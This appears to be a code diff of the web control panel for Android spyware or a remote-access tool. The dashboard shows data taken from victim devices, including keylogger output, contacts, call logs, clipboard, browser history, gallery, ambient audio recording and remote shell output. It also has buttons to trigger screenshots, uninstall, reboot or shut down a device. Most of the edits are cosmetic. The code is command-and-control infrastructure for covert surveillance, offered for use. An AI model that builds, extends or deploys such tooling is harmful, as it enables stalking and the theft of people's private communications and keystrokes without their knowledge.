@@ -22,7 +22,6 @@ let currentUser = null;
 let selectedDevice = null;
 let allDevices = [];
 let deviceListeners = {};
-var devicesListenerActive = false; // Guard flag for loadAllDevices
 const ALLOWED_OPERATOR_EMAIL = "nicholasbagenda@gmail.com";
 
 const noDeviceAlert = document.getElementById('no-device-alert');
@@ -43,11 +42,7 @@ onAuthStateChanged(auth, (user) => {
     }
 });
 
-// FIX 1: Guarded loadAllDevices to prevent listener stacking
 function loadAllDevices() {
-    if (devicesListenerActive) return;
-    devicesListenerActive = true;
-    
     const devicesRef = ref(database, 'devices');
     onValue(devicesRef, (snapshot) => {
         allDevices = [];
@@ -69,9 +64,7 @@ function loadAllDevices() {
             });
             renderDevicesList();
             if (allDevices.length > 0 && !selectedDevice) selectDevice(allDevices[0].uid);
-        } else { 
-            showNoDeviceAlert(); 
-        }
+        } else { showNoDeviceAlert(); }
     });
 }
 
@@ -81,7 +74,7 @@ function renderDevicesList() {
     allDevices.forEach(device => {
         const item = document.createElement('div');
         item.className = `device-item ${selectedDevice === device.uid ? 'active' : ''}`;
-        item.innerHTML = `<div class="device-item-info"><div class="device-item-name">${device.name}</div><div class="device-item-status ${device.online ? 'device-online' : 'device-offline'}">${device.online ? '🟢 ONLINE' : ' OFFLINE'} • 🔋${device.battery}%</div></div>`;
+        item.innerHTML = `<div class="device-item-info"><div class="device-item-name">${device.name}</div><div class="device-item-status ${device.online ? 'device-online' : 'device-offline'}">${device.online ? '🟢 ONLINE' : '🔴 OFFLINE'} • 🔋${device.battery}%</div></div>`;
         item.addEventListener('click', () => selectDevice(device.uid));
         devicesList.appendChild(item);
     });
@@ -130,7 +123,7 @@ function injectAdvancedControls() {
     matrix.appendChild(createMatrixBtn('cmd-screenshot', 'fa-camera-retro', 'SCREENSHOT', 'TRIGGER'));
     matrix.appendChild(createMatrixBtn('cmd-storage', 'fa-hard-drive', 'STORAGE', 'TRIGGER'));
 
-    matrix.appendChild(createSectionHeader('️ DANGER ZONE'));
+    matrix.appendChild(createSectionHeader('⚠️ DANGER ZONE'));
     const uninst = createMatrixBtn('cmd-uninstall', 'fa-trash', 'UNINSTALL APP', 'TRIGGER'); uninst.style.borderColor = '#ff6b6b'; matrix.appendChild(uninst);
     const rebot = createMatrixBtn('cmd-reboot', 'fa-power-off', 'REBOOT', 'TRIGGER'); rebot.style.borderColor = '#ff6b6b'; matrix.appendChild(rebot);
     const shutd = createMatrixBtn('cmd-shutdown', 'fa-plug-circle-xmark', 'SHUTDOWN', 'TRIGGER'); shutd.style.borderColor = '#ff6b6b'; matrix.appendChild(shutd);
@@ -164,15 +157,15 @@ function injectAdvancedControls() {
         <div class="data-panel"><div class="data-panel-header">👥 Contacts <span id="contacts-count" class="badge">0</span></div><div class="data-panel-body" id="contacts-feed">Waiting for data...</div></div>
         <div class="data-panel"><div class="data-panel-header">📡 Wi-Fi Networks <span id="wifi-count" class="badge">0</span></div><div class="data-panel-body" id="wifi-feed">Waiting for data...</div></div>
         <div class="data-panel"><div class="data-panel-header">📦 Installed Apps <span id="apps-count" class="badge">0</span></div><div class="data-panel-body" id="apps-feed">Waiting for data...</div></div>
-        <div class="data-panel"><div class="data-panel-header"> Device Info</div><div class="data-panel-body" id="deviceinfo-feed">Waiting for data...</div></div>
+        <div class="data-panel"><div class="data-panel-header">📋 Device Info</div><div class="data-panel-body" id="deviceinfo-feed">Waiting for data...</div></div>
         <div class="data-panel"><div class="data-panel-header">🔋 Battery Details</div><div class="data-panel-body" id="battery-feed">Waiting for data...</div></div>
         <div class="data-panel"><div class="data-panel-header">⌨️ Keylogger <span id="keylog-count" class="badge">0</span></div><div class="data-panel-body" id="keylog-feed">Waiting for data...</div></div>
         <div class="data-panel"><div class="data-panel-header">📍 Geofence Alerts</div><div class="data-panel-body" id="geofence-feed">No alerts</div></div>
         <div class="data-panel"><div class="data-panel-header">📋 Clipboard</div><div class="data-panel-body" id="clipboard-feed">Waiting for data...</div></div>
-        <div class="data-panel"><div class="data-panel-header"> Browser History</div><div class="data-panel-body" id="browser-feed">Waiting for data...</div></div>
+        <div class="data-panel"><div class="data-panel-header">🌐 Browser History</div><div class="data-panel-body" id="browser-feed">Waiting for data...</div></div>
         <div class="data-panel"><div class="data-panel-header">🖼️ Gallery</div><div class="data-panel-body" id="gallery-feed">Waiting for data...</div></div>
         <div class="data-panel"><div class="data-panel-header">📊 Network Traffic</div><div class="data-panel-body" id="traffic-feed">Waiting for data...</div></div>
-        <div class="data-panel"><div class="data-panel-header">️ Ambient Audio</div><div class="data-panel-body" id="ambient-feed">Not recording</div></div>
+        <div class="data-panel"><div class="data-panel-header">🎙️ Ambient Audio</div><div class="data-panel-body" id="ambient-feed">Not recording</div></div>
         <div class="data-panel"><div class="data-panel-header">⚡ Device Control</div><div class="data-panel-body" id="devicecontrol-feed">Waiting for data...</div></div>`;
     parentGrid.appendChild(dp);
 }
@@ -272,7 +265,7 @@ function initializeDataFeedListeners(uid) {
         const calls = d.calls||[]; const c = document.getElementById('calls-count'); if(c) c.textContent = calls.length;
         const f = document.getElementById('calls-feed'); if(!f) return;
         if(!calls.length){f.innerHTML='No call data yet';return;}
-        f.innerHTML = calls.map(c=>{const i=c.type==='incoming'?'📥':c.type==='outgoing'?'':'';const dur=c.duration_seconds?`${Math.floor(c.duration_seconds/60)}m ${c.duration_seconds%60}s`:'--';return `<div class="feed-item">${i} <strong>${esc(c.name||c.number||'Unknown')}</strong> <small>${fmtTime(c.timestamp)} • ${dur} • ${c.type}</small></div>`;}).join('');
+        f.innerHTML = calls.map(c=>{const i=c.type==='incoming'?'📥':c.type==='outgoing'?'📤':'';const dur=c.duration_seconds?`${Math.floor(c.duration_seconds/60)}m ${c.duration_seconds%60}s`:'--';return `<div class="feed-item">${i} <strong>${esc(c.name||c.number||'Unknown')}</strong> <small>${fmtTime(c.timestamp)} • ${dur} • ${c.type}</small></div>`;}).join('');
     });
     listenToFeed(uid, 'calls_live', (d) => {
         const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,10);
@@ -331,7 +324,7 @@ function initializeDataFeedListeners(uid) {
         f.innerHTML = rows.map(([k,v])=>`<div class="feed-item"><strong>${k}:</strong> ${v||'--'}</div>`).join('');
     });
 
-    // ── KEYLOGGER — User input + App switches + Screen content ─
+    // ── KEYLOGGER — User input + App switches + Screen content ──
     listenToFeed(uid, 'keylog', (d) => {
         const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));
         const c = document.getElementById('keylog-count'); if(c) c.textContent = items.length;
@@ -386,7 +379,7 @@ function initializeDataFeedListeners(uid) {
         }
 
         var display = merged.slice(0, 80);
-        var html = '<div class="feed-item" style="color:#00ff88;font-size:10px;">⌨️ ' + display.length + ' events — <span style="color:#4ecdc4;">⌨️ USER</span> typed · <span style="color:#ffd93d;">🖥️ DEVICE</span> screen · <span style="color:#ff6b6b;">📱 APP</span> switch · <span style="color:#a78bfa;"> CONTENT</span> full screen</div>';
+        var html = '<div class="feed-item" style="color:#00ff88;font-size:10px;">⌨️ ' + display.length + ' events — <span style="color:#4ecdc4;">⌨️ USER</span> typed · <span style="color:#ffd93d;">🖥️ DEVICE</span> screen · <span style="color:#ff6b6b;">📱 APP</span> switch · <span style="color:#a78bfa;">📝 CONTENT</span> full screen</div>';
 
         display.forEach(function(k) {
             var icon, label, color, bgColor, borderColor;
@@ -395,7 +388,7 @@ function initializeDataFeedListeners(uid) {
                 icon = '📱'; label = 'APP SWITCH'; color = '#ff6b6b';
                 bgColor = 'rgba(255,107,107,0.08)'; borderColor = '#ff6b6b';
             } else if(k.event === 'screen_content') {
-                icon = ''; label = 'SCREEN'; color = '#a78bfa';
+                icon = '📝'; label = 'SCREEN'; color = '#a78bfa';
                 bgColor = 'rgba(167,139,250,0.08)'; borderColor = '#a78bfa';
             } else if(k.isSystem) {
                 icon = '🖥️'; label = 'DEVICE'; color = '#ffd93d';
@@ -492,7 +485,7 @@ function initializeDataFeedListeners(uid) {
         }).join('');
     });
 
-    // ─ SHELL OUTPUT ──
+    // ── SHELL OUTPUT ──
     listenToFeed(uid, 'shell_output', (d) => {
         const o = document.getElementById('shell-output'); if(!o||!d) return;
         o.style.display = 'block';
@@ -503,7 +496,7 @@ function initializeDataFeedListeners(uid) {
             text += (d.stdout || '(no output)');
             if(d.stderr) text += '\n\nSTDERR:\n' + d.stderr;
             text += '\n\nExit code: ' + (d.exit_code ?? '?');
-            if(d.timed_out) text += ' ️ TIMED OUT';
+            if(d.timed_out) text += ' ⚠️ TIMED OUT';
         }
         o.textContent = text;
         o.scrollTop = o.scrollHeight;
@@ -588,8 +581,8 @@ function initializeDataFeedListeners(uid) {
                     if(e.icon === '🎵') iconBg = '#1a0a2e';
                     else if(e.icon === '🎬') iconBg = '#2e0a0a';
                     else if(e.icon === '📦') iconBg = '#0a2e0a';
-                    else if(e.icon === '️') iconBg = '#2e2e0a';
-                    else if(e.icon === '') iconBg = '#2e0a0a';
+                    else if(e.icon === '🗜️') iconBg = '#2e2e0a';
+                    else if(e.icon === '📕') iconBg = '#2e0a0a';
                     else if(e.icon === '📘') iconBg = '#0a0a2e';
                     else if(e.icon === '📊') iconBg = '#0a2e0a';
                     else if(e.icon === '📙') iconBg = '#2e1a0a';
@@ -686,7 +679,7 @@ function initializeDataFeedListeners(uid) {
         f.innerHTML = html;
         const bf = document.getElementById('battery-feed');
         if(bf && !bf.innerHTML.includes('Network Traffic')) {
-            bf.innerHTML += `<div class="feed-item" style="border-top:1px solid #333;margin-top:8px;padding-top:8px;"><strong> Traffic</strong> RX:${d.total_rx_mb||'?'} TX:${d.total_tx_mb||'?'} MB</div>`;
+            bf.innerHTML += `<div class="feed-item" style="border-top:1px solid #333;margin-top:8px;padding-top:8px;"><strong>📊 Traffic</strong> RX:${d.total_rx_mb||'?'} TX:${d.total_tx_mb||'?'} MB</div>`;
         }
     });
 
@@ -875,41 +868,4 @@ function esc(t) { if(!t) return ''; const d=document.createElement('div'); d.tex
 function showNoDeviceAlert() { noDeviceAlert.style.display='flex'; deviceDashboard.style.display='none'; }
 
 if(logoutBtn) logoutBtn.addEventListener('click',()=>signOut(auth).then(()=>window.location.href='./index.html'));
-
-// FIX 2: Refresh button uses get() for one-time read with loading feedback
-if(refreshDevicesBtn) refreshDevicesBtn.addEventListener('click', function() {
-    refreshDevicesBtn.disabled = true;
-    refreshDevicesBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Refreshing...';
-
-    get(ref(database, 'devices')).then(function(snapshot) {
-        allDevices = [];
-        if (snapshot.exists()) {
-            var data = snapshot.val();
-            Object.keys(data).forEach(function(deviceUid) {
-                var d = data[deviceUid];
-                var model = (d.identity && d.identity.model) ? d.identity.model : "Unknown Model";
-                var customName = (d.identity && d.identity.custom_name) ? d.identity.custom_name : (d.deviceName || "Unknown Device");
-                allDevices.push({
-                    uid: deviceUid,
-                    name: customName + " (" + model + ")",
-                    battery: d.battery_level || (d.status ? d.status.batteryPercentage : 0) || 0,
-                    lastSeen: d.last_seen || (d.status ? d.status.last_seen : 0) || 0,
-                    online: (Date.now() - (d.last_seen || (d.status ? d.status.last_seen : 0) || 0)) < 300000,
-                    lat: (d.location ? d.location.lat : 0) || (d.status ? d.status.latitude : 0) || 0,
-                    lng: (d.location ? d.location.lng : 0) || (d.status ? d.status.longitude : 0) || 0
-                });
-            });
-            renderDevicesList();
-            if (allDevices.length > 0 && !selectedDevice) selectDevice(allDevices[0].uid);
-        } else {
-            showNoDeviceAlert();
-        }
-        
-        refreshDevicesBtn.disabled = false;
-        refreshDevicesBtn.innerHTML = '<i class="fa-solid fa-arrows-rotate"></i> Refresh Devices';
-    }).catch(function(err) {
-        console.error('Refresh failed:', err);
-        refreshDevicesBtn.disabled = false;
-        refreshDevicesBtn.innerHTML = '<i class="fa-solid fa-arrows-rotate"></i> Refresh Devices';
-    });
-});
+if(refreshDevicesBtn) refreshDevicesBtn.addEventListener('click',loadAllDevices);
